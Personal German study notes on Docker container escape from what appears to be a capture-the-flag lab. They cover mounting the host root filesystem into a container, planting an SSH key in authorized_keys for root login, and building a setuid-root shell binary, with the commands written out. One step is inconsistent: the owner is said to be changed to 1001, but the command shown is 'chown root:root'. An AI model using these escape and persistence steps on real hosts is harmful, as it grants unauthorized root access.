#### Hacking
1. Verbinden mit Server
2. Schauen ob Docker Daemon erreichbar
	1. Falls Ja, neuen Container aufmachen mit gemountetem root directory
	   `docker image`
	   `docker run -it --rm -v /:/mnt/host <imageID>` 
	   (evtl `/bin/bash` falls nicht automatisch)
3. Schauen ob Directory Mounted
   `df -h` Zeigt Filesysteminfos, man sieht was gemounted
   `mount` Zeigt alle gemounteten Directorys an
   1. Falls Ja, liegt ein SSH Ordner im Directory? (/.ssh/)
	   1. Falls Ja, meinen SSH Public Key in /.ssh/authorized_keys legen auf Docker
	      Mit Strg + C & Strc + V.
	      Oder
	      `cat id_ed25519.pub | ssh <user>@<URL> -p <port> 'cat >> /<PathMountedDir>/.ssh/authorized_keys'`
	   3. Mit SSH als root verbinden und schauen was so abgeht auf Hostsystem
	      `sudo ssh `

$\rightarrow$ Privilege Escalation auf Host System falls noch nicht root

#### Commands
Docker help
`sudo docker help`

Download Docker Image
`sudo docker pull <url>`

Start Docker Daemon Manually
`sudo systemctl start docker`

List containers
`sudo docker ps`

List images
`sudo docker images`

Start local Docker and get a shell
`sudo docker run --rm -it <imageID> /bin/bash`

Show image history
`sudo docker image history --no-trunc <imageID>`

Show Infos über image
`sudo docker image inspect <imageID>`

Image history reverten
https://gist.github.com/dasgoll/476ecc7a057ac885f0be

Falls history `<missing>` dann image inspect
und durch die Diff Ordner suchen bis man die Datei findet die man sucht

Mit externem Docker verbinden
`ssh root@domain -p <port>`


#### Solutions Exercises
##### Part IV
Wir befanden uns auf einer Host Maschine mit User Student. Der konnte den Docker Daemon benutzen. Es gab ein Image mit Root Rechten. Dies haben wir gestartet mit gemountetem Host Directory `docker run --rm -it -v /:/mnt/host IMAGE_ID /bin/bash`. Dann haben wir unseren SSH public key auf in  den User Student Ordner auf dem Host System kopiert mit `cat ssh-key.pub | ssh -p 22 student@four.sandbox-escape.scenario.cip.institute 'cat >> /home/student/.ssh/authorized_keys'`. Anschließend über dem auf dem Host laufenden Docker Image unseren SSH Key in das Root Verzeichnis gelegt mit `cat /mnt/host/home/student/.ssh/authorized_keys >> ./.ssh/authorized_keys`. Dann konnten wir uns als Root ohne Passwort mit dem Host System verbinden via SSH mit `sudo ssh -p 22 -i /home/ssh-key root@four.sandbox-escape.scenario.cip.institute`.

##### Part VI
Per SSH mit Docker verbunden.  Mit 'df -h' und 'mount' gemountete Filesystems gefunden '/dev/vda1' auf '/home/student/'. Anschließend in das gemountete Directory meinen public ssh Key kopiert ('/home/student/.ssh/authorized_keys'). Anschließend per SSH als student user mit dem Host verbinden

Verbleibt Root zu werden. Dazu schrieb ich ein C Programm welches mit uid 0 läuft (root rechten) und eine Shell öffnet. Das Programm schrieb ich im Docker (könnte man auch mit scp kopieren), kompilierte es und setzte das setuid bit auf 1 mit 'chmod u+s prog'. Anschließend änderte ich den Owner zu 1001 ('chown root:root prog'), da dies auf dem Host der Student User ist und ich somit später das Programm ausführen konnte. Anschließend wieder per SSH als student verbinden. Dann Programm starten, durch setuid Shell mit Root rechten. Root Ordner navigieren und Flag abholen

#### Simple Web Docker
```
FROM ubuntu

RUN apt -y update && apt -y install python3
COPY hello /hello
CMD ["python3", "-m", "http.server"]
```

`sudo docker build -t test`

`sudo docker run -it --rm -p 80:8000 test`
`curl localhost:80`
